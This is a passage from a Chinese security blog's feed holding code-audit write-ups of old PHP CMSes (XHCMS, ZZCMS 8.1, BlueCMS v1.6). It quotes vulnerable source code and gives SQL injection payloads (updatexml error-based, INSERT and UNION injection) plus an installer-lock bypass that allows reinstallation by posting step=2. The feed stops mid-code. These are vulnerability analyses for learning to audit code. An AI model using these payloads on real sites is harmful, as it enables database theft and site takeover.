class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$save=$_POST[&apos;save&apos;];</span><br><span class="line">$name=$_POST[&apos;name&apos;];</span><br><span class="line">$url=$_POST[&apos;url&apos;];</span><br><span class="line">$mail=$_POST[&apos;mail&apos;];</span><br><span class="line">$jieshao=$_POST[&apos;jieshao&apos;];</span><br><span class="line">$xs=$_POST[&apos;xs&apos;];</span><br><span class="line">$query = &quot;INSERT INTO link (name,url,mail,jieshao,xs,date) VALUES (&apos;$name&apos;,&apos;$url&apos;,&apos;$mail&apos;,&apos;jieshao&apos;,&apos;xs&apos;,now())&quot;;</span><br><span class="line">@mysql_query($query) or die(&apos;新增错误：&apos;.mysql_error());</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;亲爱的，链接已经成功添加。&apos;);location.href=&apos;?r=linklist&apos;&lt;/script&gt;&quot;; </span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是一个利用<code>insert</code>的报错注入，同样在页面添加友情链接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or  (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or&apos;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_14.jpg" alt=""></p><p>保存得到报错信息。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_15.jpg" alt=""></p><h3><span id="结语">结语</span></h3><p>其实还是一套简单的CMS，也是常见的漏洞。代码也比较简单，也没有过多的防护。这里找到的一个<code>cookie伪造越权访问</code>漏洞，这种是自动审计工具没法发现的点，所以还是需要自己去读代码的逻辑。结合这个漏洞，就可以在没有后台管理员权限的情况下进行后台的SQL注入。所以结合不同的漏洞去得到一个<code>webshell</code>是需要学习的点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h3&gt;&lt;span id=&quot;前言&quot;&gt;前言&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;菜狗子学代码审计，只能挑挑软柿子捏一捏了。MVC框架现在估计是审计不出来，只能找找代码流不仅小一点，小型的CMS下手了。所以找了这一套又老有小的CMS来练练手了，目前还是用&lt;code
      
    
    </summary>
    
      <category term="代码审计" scheme="https://uknowsec.cn/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>代码审计2-ZZCMS8.1</title>
    <link href="https://uknowsec.cn/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12-ZZCMS8-1.html"/>
    <id>https://uknowsec.cn/posts/代码审计/代码审计2-ZZCMS8-1.html</id>
    <published>2018-09-02T12:59:25.000Z</published>
    <updated>2019-01-07T08:24:19.761Z</updated>
    
    <content type="html"><![CDATA[<!-- ttoc --><h3><span id="前言">前言</span></h3><p>前一篇博客结语中立下的Flag，找了一套内容管理系统ZZCMS8.1。从简单的CMS下手吧。</p><h3><span id="zzcms81">ZZCMS8.1</span></h3><h4><span id="后台adminadclassphp注入">后台/admin/adclass.php注入</span></h4><p>在路径<code>/admin/adclass.php</code>有如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;Select * from zzcms_adclass where classid=&quot; .$classid.&quot;&quot;;</span><br><span class="line">$rs=query($sql);</span><br><span class="line">$row=fetch_array($rs);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;div class=&quot;admintitle&quot;&gt;修改大类&lt;/div&gt;</span><br><span class="line">&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;?dowhat=modifybigclass&quot; onSubmit=&quot;return CheckForm();&quot;&gt;</span><br><span class="line">  &lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;5&quot; cellspacing=&quot;0&quot;&gt;</span><br><span class="line">    &lt;tr&gt; </span><br><span class="line">      &lt;td width=&quot;322&quot; align=&quot;right&quot; class=&quot;border&quot;&gt;大类ID：&lt;/td&gt;</span><br><span class="line">      &lt;td class=&quot;border&quot;&gt;&lt;?php echo $row[&quot;classid&quot;]?&gt; &lt;input name=&quot;classid&quot; type=&quot;hidden&quot; id=&quot;classid&quot; value=&quot;&lt;?php echo $row[&quot;classid&quot;]?&gt;&quot;&gt;      &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt; </span><br><span class="line">      &lt;td align=&quot;right&quot; class=&quot;border&quot;&gt;大类名称：&lt;/td&gt;</span><br><span class="line">      &lt;td class=&quot;border&quot;&gt; &lt;input name=&quot;classname&quot; type=&quot;text&quot; id=&quot;classname&quot; value=&quot;&lt;?php echo $row[&quot;classname&quot;]?&gt;&quot; size=&quot;60&quot; maxlength=&quot;30&quot;&gt; </span><br><span class="line">        &lt;input name=&quot;oldclassname&quot; type=&quot;hidden&quot; id=&quot;oldclassname&quot; value=&quot;&lt;?php echo $row[&quot;classname&quot;]?&gt;&quot; size=&quot;60&quot; maxlength=&quot;30&quot;&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">   </span><br><span class="line">    &lt;tr&gt; </span><br><span class="line">      &lt;td class=&quot;border&quot;&gt;&amp;nbsp;&lt;/td&gt;</span><br><span class="line">      &lt;td class=&quot;border&quot;&gt; &lt;input name=&quot;action&quot; type=&quot;hidden&quot; id=&quot;action&quot; value=&quot;modify&quot;&gt; </span><br><span class="line">        &lt;input name=&quot;save&quot; type=&quot;submit&quot; id=&quot;save&quot; value=&quot; 修 改 &quot;&gt; &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">  &lt;/table&gt;</span><br></pre></td></tr></table></figure><p>以上代码中的<code>$sql=&quot;Select * from zzcms_adclass where classid=&quot; .$classid.&quot;&quot;;</code>看似是能进行联合查询注入的。找到<code>$classid</code>变量的来源。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_REQUEST[&apos;classid&apos;]))&#123;</span><br><span class="line">$classid=trim($_REQUEST[&apos;classid&apos;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$classid=&quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$classid</code>仅用<code>trim()</code>函数移除字符串两侧的空白字符 ，虽然对<code>$_GET</code>、<code>$_POST</code>、<code>$REUQEST</code>的变量进行的单引号转义操作，但是这里是不需要逃逸单引号，直接使用联合查询注入。</p><p>测试利用常见的<code>union</code>型注入手注。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_1.jpg" alt=""></p><p>查询结果直接用<code>echo</code>显示到<code>html</code>。</p><p>PHPstorm下断点进行调试</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_2.jpg" alt=""></p><h4><span id="后台adminaboutphp注入">后台/admin/about.php注入</span></h4><h5><span id="insert-注入">INSERT 注入</span></h5><p>在路径<code>/admin/about.php</code>如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if ($action==&quot;savedata&quot; )&#123;</span><br><span class="line">checkadminisdo(&quot;bottomlink&quot;);</span><br><span class="line">$saveas=trim($_REQUEST[&quot;saveas&quot;]);</span><br><span class="line">$title=trim($_POST[&quot;title&quot;]);</span><br><span class="line">$content=stripfxg(rtrim($_POST[&quot;info_content&quot;]));</span><br><span class="line">$link=trim($_POST[&quot;link&quot;]);</span><br><span class="line">if ($saveas==&quot;add&quot;)&#123;</span><br><span class="line">query(&quot;insert into zzcms_about (title,content)VALUES(&apos;$title&apos;,&apos;$content&apos;) &quot;);</span><br><span class="line">$go=1;</span><br><span class="line">//echo &quot;&lt;script&gt;location.href=&apos;about_manage.php&apos;&lt;//script&gt;&quot;;</span><br><span class="line">&#125;elseif ($saveas==&quot;modify&quot;)&#123;</span><br><span class="line">query(&quot;update zzcms_about set title=&apos;$title&apos;,content=&apos;$content&apos;,link=&apos;$link&apos; where id=&quot;. $_POST[&apos;id&apos;].&quot; &quot;);</span><br><span class="line">$go=1;</span><br><span class="line">//echo &quot;&lt;script&gt;location.href=&apos;about_manage.php&apos;&lt;//script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码中有两处SQL语句操作，<code>query(&quot;insert into zzcms_about (title,content)VALUES(&#39;$title&#39;,&#39;$content&#39;) &quot;);</code> 这里是用的<code>insert</code>语句，和我上次看的那套bluecms的注入是相似的，主要是闭合构造<code>payload</code>。</p><p><code>$title</code>和<code>$content</code>做了一定的处理，<code>$title</code>用<code>trim()</code>函数移除字符串两侧的空白字符，<code>$content</code>用到了一个<code>stripfxg()</code>函数。找到这个函数的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function stripfxg($string) &#123;//去反斜杠 </span><br><span class="line">$string=stripslashes($string);//去反斜杠,不开get_magic_quotes_gpc 的情况下，在stopsqlin中都加上了，这里要去了</span><br><span class="line">$string=htmlspecialchars_decode($string);//转html实体符号</span><br><span class="line">return $string; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据函数的注释，该函数的功能是用来去除反斜杠和转html实体符号的。</p><p>这里不能利用到<code>$title</code>来进行插入<code>payload</code>，因为全局的单引号转义，但是可以利用<code>$content</code>这个变量，它传入值的单引号被加斜杠转移了，但是有被<code>stripfxg()</code>函数把单引号去除了。所以可以利用这个变量插入<code>payload</code>。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_3.jpg" alt=""></p><p>以以上方式插入<code>payload</code>，<code>PHPStrom</code>跟进调试。<code>$content</code>的内容先转义单引号后再被函数除去反斜杠导致可以利用到</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_4.jpg" alt=""></p><p>之后传入上面代码说到的<code>insert</code>操作语句<code>query(&quot;insert into zzcms_about (title,content)VALUES(&#39;$title&#39;,&#39;$content&#39;) &quot;);</code>。</p><p>构造成如下语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into zzcms_about (title,content)VALUES(&apos;$title&apos;,&apos;1),((select version()),&apos;1&apos;)</span><br></pre></td></tr></table></figure><p>注入成功。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_5.jpg" alt=""></p><h5><span id="union注入">union注入</span></h5><p>同样在路径<code>/admin/about.php</code>如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ($action==&quot;modify&quot;) &#123;</span><br><span class="line">$sql=&quot;select * from zzcms_about where id=&quot;.$_REQUEST[&quot;id&quot;].&quot;&quot;;</span><br><span class="line">$rs=query($sql);</span><br><span class="line">$row=fetch_array($rs);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>$sql=&quot;select * from zzcms_about where id=&quot;.$_REQUEST[&quot;id&quot;].&quot;&quot;;</code>这个SQL操作语句也没有做任何过滤，可以直接进行联合查询注入。注入结果输出到<code>html</code>显示。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_6.jpg" alt=""></p><p>成功注入。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_7.jpg" alt=""></p><h4><span id="后台adminhelp_managephp注入">后台/admin/help_manage.php注入</span></h4><h4><span id="union注入">union注入</span></h4><p>在路径<code>/admin/help_manage.php</code>文件中有如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from zzcms_help where classid=&quot;.$b.&quot; &quot;;</span><br><span class="line">if ($keyword&lt;&gt;&quot;&quot;) &#123;  </span><br><span class="line">$sql=$sql.&quot; and  title like &apos;%&quot;.$keyword.&quot;%&apos; &quot;;</span><br><span class="line">&#125;</span><br><span class="line">$rs = query($sql,$conn); </span><br><span class="line">$totlenum= num_rows($rs);  </span><br><span class="line">$totlepage=ceil($totlenum/$page_size);</span><br><span class="line"></span><br><span class="line">$sql=$sql . &quot; order by id desc limit $offset,$page_size&quot;;</span><br><span class="line">$rs = query($sql,$conn);</span><br></pre></td></tr></table></figure><p><code>$sql=&quot;select * from zzcms_help where classid=&quot;.$b.&quot; &quot;;</code>这个SQL语句操作可以利用，找到变量<code>$b</code>的来源。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b=isset($_REQUEST[&quot;b&quot;])?$_REQUEST[&quot;b&quot;]:&apos;&apos;;</span><br></pre></td></tr></table></figure><p>变量没有经过处理，可以直接利用。只是一个简单冒号判断式。</p><p><code>$sql=$sql . &quot; order by id desc limit $offset,$page_size&quot;;</code>这个拼接可以利用<code>#</code>注释掉，然后通过<code>while($row = fetch_array($rs))</code>输出到<code>html</code>。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_8.jpg" alt=""></p><p>返回注入结果</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_9.jpg" alt=""></p><h4><span id="后台adminjobclassmanagephp注入">后台/admin/jobclassmanage.php注入</span></h4><h5><span id="union注入">union注入</span></h5><p>和前面找到的注入是一样的，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;Select * from zzcms_jobclass where classid=&quot; .$classid.&quot;&quot;;</span><br><span class="line">$rs=query($sql);</span><br><span class="line">$row=fetch_array($rs);</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_10.jpg" alt=""></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_11.jpg" alt=""></p><h4><span id="installindexphp重装漏洞">/install/index.php重装漏洞</span></h4><p>在路径<code>/install/index.php</code>中有如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">switch($step) &#123;</span><br><span class="line">case &apos;1&apos;://协议</span><br><span class="line">include &apos;step_&apos;.$step.&apos;.php&apos;;</span><br><span class="line">break;</span><br><span class="line">case &apos;2&apos;://环境</span><br><span class="line">$pass = true;</span><br><span class="line">$PHP_VERSION = PHP_VERSION;</span><br><span class="line">if(version_compare($PHP_VERSION, &apos;4.3.0&apos;, &apos;&lt;&apos;)) &#123;</span><br><span class="line">$php_pass = $pass = false;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$php_pass = true;</span><br><span class="line">&#125;</span><br><span class="line">$PHP_MYSQL = &apos;&apos;;</span><br><span class="line">if(extension_loaded(&apos;mysql&apos;)) &#123;</span><br><span class="line">$PHP_MYSQL = &apos;支持&apos;;</span><br><span class="line">$mysql_pass = true;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$PHP_MYSQL = &apos;不支持&apos;;</span><br><span class="line">$mysql_pass = $pass = false;</span><br><span class="line">&#125;</span><br><span class="line">        $PHP_GD = &apos;&apos;;</span><br><span class="line">        if(function_exists(&apos;imagejpeg&apos;)) $PHP_GD .= &apos;jpg&apos;;</span><br><span class="line">        if(function_exists(&apos;imagegif&apos;)) $PHP_GD .= &apos; gif&apos;;</span><br><span class="line">        if(function_exists(&apos;imagepng&apos;)) $PHP_GD .= &apos; png&apos;;</span><br><span class="line">if($PHP_GD) &#123;</span><br><span class="line">$gd_pass = true;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$gd_pass = false;</span><br><span class="line">&#125;</span><br><span class="line">$PHP_URL = @get_cfg_var(&quot;allow_url_fopen&quot;);//是否支持远程URL，采集有用</span><br><span class="line">$url_pass = $PHP_URL ? true : false;</span><br><span class="line">include &apos;step_&apos;.$step.&apos;.php&apos;;</span><br><span class="line">break;</span><br><span class="line">case &apos;3&apos;://查目录属性</span><br><span class="line">include &apos;step_&apos;.$step.&apos;.php&apos;;</span><br><span class="line">break;</span><br><span class="line">case &apos;4&apos;://建数据库</span><br><span class="line">include &apos;step_&apos;.$step.&apos;.php&apos;;</span><br><span class="line">break;</span><br><span class="line">case &apos;5&apos;://安装进度</span><br><span class="line">function dexit($msg) &#123;</span><br><span class="line">echo &apos;&lt;script&gt;alert(&quot;&apos;.$msg.&apos;&quot;);window.history.back();&lt;/script&gt;&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码是用了一个<code>switch-case</code>来进行一个安装的过程。回溯到<code>step</code>变量的来源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$step = isset($_POST[&apos;step&apos;]) ? $_POST[&apos;step&apos;] : 1;</span><br></pre></td></tr></table></figure><p>一个冒号运算符，这里可以用<code>POST</code>方式提交一个<code>step</code>值。</p><p>跟进<code>switch-case</code>语句的执行。<code>case &#39;1&#39;:</code>进入<code>\install\step_1.php</code>中，在该文件中的开头有验证<code>/install/install.lock 文件</code>的过程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(file_exists(&quot;install.lock&quot;))&#123;</span><br><span class="line">echo &quot;&lt;div style=&apos;padding:30px;&apos;&gt;安装向导已运行安装过，如需重安装，请删除 /install/install.lock 文件&lt;/div&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>继续跟进<code>switch-case</code>语句的执行。在<code>\install\step_2.php</code>中，但是在该文件中并没有验证<code>/install/install.lock 文件</code>的过程。而且在后续的<code>case</code>值里也没有验证。</p><p>所以可以直接提交POST数据<code>step=2</code>，跳过验证进行重装。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_12.jpg" alt=""></p><h3><span id="结语">结语</span></h3><p>这套源码还是相当于简单一点，前台的SQL注入都是做了过滤的。但是在后台的数字型的SQL注入都是没有做过滤的。同时后台也对单引号进行了转义操作，在文章提到的<code>insert</code>注入是因为CMS先对单引号进行的转义操作，后来又把反斜杠给除去了。所以可以利用<code>insert</code>注入。后台的注入相较于来还是比较鸡肋的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h3&gt;&lt;span id=&quot;前言&quot;&gt;前言&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;前一篇博客结语中立下的Flag，找了一套内容管理系统ZZCMS8.1。从简单的CMS下手吧。&lt;/p&gt;
&lt;h3&gt;&lt;span id=&quot;zzcms81&quot;&gt;ZZCMS8.1&lt;/span&gt;&lt;/
      
    
    </summary>
    
      <category term="代码审计" scheme="https://uknowsec.cn/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>代码审计初体验-bluecms_v1.6_sp1</title>
    <link href="https://uknowsec.cn/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E4%BD%93%E9%AA%8C-bluecms-v1-6-sp1.html"/>
    <id>https://uknowsec.cn/posts/代码审计/代码审计初体验-bluecms-v1-6-sp1.html</id>
    <published>2018-08-27T11:41:02.000Z</published>
    <updated>2019-01-07T08:24:19.770Z</updated>
    
    <content type="html"><![CDATA[<!-- ttoc --><h3><span id="前言">前言</span></h3><p>一些想做一些代码审计的内容，之前只有做过简单的PHP代码段的审计，没有尝试过整站的代码审计的工作。所以一切重新开始，从最简单的开始。找一些比较老和简单的CMS进行代码审计的训练，熟悉流程，熟悉用PHP调试的方法跟进。</p><h3><span id="bluecms_v16_sp1">Bluecms_v1.6_sp1</span></h3><h4><span id="sql注入一">SQL注入一</span></h4><p>在<code>/uploads/uc_client</code>路径下中可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br><span class="line">if(empty($ad_id))</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;Error!&apos;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id);</span><br></pre></td></tr></table></figure><p>这里可以看到<code>ad_id</code>传入一个ID值，判断该值是否为空。在代入自定义的函数<code>getone()</code></p><p>查找函数<code>getone()</code>到路径<code>\uploads\include\mysql.class.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function getone($sql, $type=MYSQL_ASSOC)&#123;</span><br><span class="line">$query = $this-&gt;query($sql,$this-&gt;linkid);</span><br><span class="line">$row = mysql_fetch_array($query, $type);</span><br><span class="line">return $row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里封装成了简单的SQL查询函数，函数的第二个参数指定数组类型，<code>MYSQL_ASSOC</code>是关联数组。</p><p><code>PhpStorm</code>调试跟进，跟进到了<code>\uploads\include\common.fun.php</code> 这个一个公共函数的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function table($table)</span><br><span class="line">&#123;</span><br><span class="line">global $pre;</span><br><span class="line">return  $pre .$table ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$pre</code>的一个全局变量，在<code>uploads\data\config.php</code>定义的值为<code>blue_</code>即安装文件时的表面前缀。</p><p>所以<code>$table</code>函数返回的是一个表名<code>blue_ad</code>。</p><p>进一步跟进就到了<code>getone()</code>函数进行SQL语句的查询，再进入一个<code>time_set</code>判断过程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if($ad[&apos;time_set&apos;] == 0)</span><br><span class="line">&#123;</span><br><span class="line">$ad_content = $ad[&apos;content&apos;];</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">if($ad[&apos;end_time&apos;] &lt; time())</span><br><span class="line">&#123;</span><br><span class="line">$ad_content = $ad[&apos;exp_content&apos;];</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$ad_content = $ad[&apos;content&apos;];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再做个替换进行输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ad_content = str_replace(&apos;&quot;&apos;, &apos;\&quot;&apos;,$ad_content);</span><br><span class="line">$ad_content = str_replace(&quot;\r&quot;, &quot;\\r&quot;,$ad_content);</span><br><span class="line">$ad_content = str_replace(&quot;\n&quot;, &quot;\\n&quot;,$ad_content);</span><br><span class="line">echo &quot;&lt;!--\r\ndocument.write(\&quot;&quot;.$ad_content.&quot;\&quot;);\r\n--&gt;\r\n&quot;;</span><br></pre></td></tr></table></figure><p>传入<code>Payload</code>利用<code>PHPstorm</code>调试进行跟进测试。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms1.jpg" alt=""></p><p><code>$ad_id</code>直接代入<code>$sql</code>进行SQL查询。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms2.jpg" alt=""></p><p>继续跟进返回查询结果，注入成功返回admin用户的<code>username:password</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms3.jpg" alt=""></p><h4><span id="sql注入二">SQL注入二</span></h4><p>在<code>\uploads\include\common.fun.php</code>文件中有<code>getip()</code>函数，该函数是用来获取用户IP。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function getip()</span><br><span class="line">&#123;</span><br><span class="line">if (getenv(&apos;HTTP_CLIENT_IP&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_CLIENT_IP&apos;); </span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;)) </span><br><span class="line">&#123; //获取客户端用代理服务器访问时的真实ip 地址</span><br><span class="line">$ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_X_FORWARDED&apos;)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(&apos;HTTP_X_FORWARDED&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;); </span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_FORWARDED&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_FORWARDED&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123; </span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">return $ip;</span><br><span 